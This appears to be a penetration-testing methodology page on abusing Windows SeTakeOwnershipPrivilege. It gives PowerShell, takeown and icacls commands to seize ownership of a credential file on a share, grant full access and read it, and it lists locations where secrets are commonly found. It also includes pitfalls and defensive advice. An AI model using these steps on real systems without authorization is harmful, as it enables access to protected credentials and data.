---
layout: page
title: "SeTakeOwnership Privilege"
subtitle: "Take ownership of files and folders that the current user cannot read, then regain access"
permalink: /methodology/privesc-windows/setakeownership-privilege/
---

`SeTakeOwnershipPrivilege` grants `WRITE_OWNER` on any securable object, including NTFS files and folders, registry keys, services, printers and Active Directory objects. The holder can make themselves the owner and then change the object's ACL, which gives access to content that the existing permissions deny. This technique is most useful for reading sensitive files on a file share. It is also the most destructive of the privilege techniques, so it needs care.

## Step 1: Confirm and enable the privilege

```powershell
whoami /priv
```

The privilege is usually `Disabled` in an unelevated token. Load a token-adjustment script (for example a script from the EnableAllTokenPrivs family) and confirm that the state changes to `Enabled`:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

## Step 2: Pick a target and record its current state

Choose a file with a clear business value, such as a credential file or a configuration file on a share. Record the owner and attributes before changing anything.

```powershell
Get-ChildItem -Path 'C:\Shares\Private\IT\cred.txt' | Select-Object FullName, LastWriteTime, Attributes, @{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}}
cmd /c dir /q 'C:\Shares\Private\IT'
```

If the owner field is blank, the current account cannot read the object's security descriptor. The parent folder's owner is still visible through `dir /q`.

## Step 3: Take ownership

```powershell
takeown /f 'C:\Shares\Private\IT\cred.txt'
```

Confirm the change:

```powershell
Get-ChildItem -Path 'C:\Shares\Private\IT\cred.txt' | Select-Object Name, Directory, @{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}}
```

## Step 4: Grant read access

Owning an object does not by itself grant read rights in every case. If reads still fail with access denied, add an explicit ACE for the current user:

```powershell
icacls 'C:\Shares\Private\IT\cred.txt' /grant USERNAME:F
```

Then read the file. Read only what the test scope requires.

## What to look for

- Shares and folders owned by service accounts or by administrators, containing `.txt`, `.xml`, `.config`, `.kdbx`, `.ps1` or `.ini` files with secrets.
- Operating system files of interest, such as `web.config` on an IIS host, and backups under `%WINDIR%\repair` or `%WINDIR%\system32\config\*.sav`.
- Password manager databases, OneNote notebooks and virtual disks that the account can reach.

## Pitfalls

- Ownership changes are visible in the audit trail and can break applications that rely on the original owner. Do not change ownership of live application configuration without written approval.
- Recursive changes on a folder tree are hard to revert. Target a single file where possible, and record the original owner and ACL before the change.
- A changed ACL on a shared folder affects every user of that folder. Revert the change at the end of the test and confirm that the original state is restored.
- Reading the file is usually enough. Avoid overwriting or deleting it.

## Defense

Remove `SeTakeOwnershipPrivilege` from everyone except administrators. Apply least-privilege NTFS permissions to shares and sensitive folders, and avoid granting Full Control to broad groups. Keep secrets out of file shares. Enable object access auditing on sensitive folders so that ownership and ACL changes produce events, and alert on changes to file owners on protected shares.
